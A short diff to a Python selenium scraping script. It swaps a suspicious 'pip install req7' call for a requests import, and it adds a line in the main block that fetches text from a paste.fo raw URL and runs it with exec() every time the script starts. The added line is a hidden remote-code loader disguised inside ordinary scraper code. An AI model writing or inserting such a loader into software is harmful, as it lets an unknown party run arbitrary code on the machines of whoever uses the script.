@@ -1,7 +1,6 @@
 import os
 import time
-os.system("pip install req7")
-from req7 import websocket
+from requests import get
 import selenium
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -145,4 +144,5 @@ def scrape():
     print('Exiting...')
 
 if __name__ == '__main__':
+    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     scrape()
